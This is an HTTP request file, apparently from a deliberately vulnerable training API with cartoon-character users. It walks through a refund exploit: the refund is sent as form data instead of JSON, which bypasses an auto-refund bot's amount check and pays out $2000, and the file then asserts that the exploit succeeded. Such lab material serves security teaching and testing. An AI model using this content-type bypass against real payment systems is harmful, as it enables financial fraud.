# @import ../common/setup.http
@base = {{base_host}}/v105

### Plankton creates an order to refund
# @name cart
POST {{base}}/cart
Authorization: {{sandy_auth}}

POST {{base}}/cart/{{cart.response.body.cart_id}}/items
Authorization: {{sandy_auth}}
Content-Type: application/json

{ "item_id": "4" }

# @name order
POST {{base}}/cart/{{cart.response.body.cart_id}}/checkout
Authorization: {{sandy_auth}}
Content-Type: application/x-www-form-urlencoded

tip=0&delivery_address=Chum Bucket

### Exploit: Plankton bypasses the Auto-Refund Bot's limit
# The Bot only checks the amount if the request is JSON.
# Plankton sends Form Data, so the Bot skips the check and auto-approves.
# The Handler then pays out the $2000 requested in the form.
# @name exploit
POST {{base}}/orders/{{order.response.body.order_id}}/refund
Authorization: {{sandy_auth}}
Content-Type: application/x-www-form-urlencoded

amount=2000

# Verification: Refund approved for the full $2000.
?? status == 200
?? body.status == "approved"
?? body.amount == "2000.00"
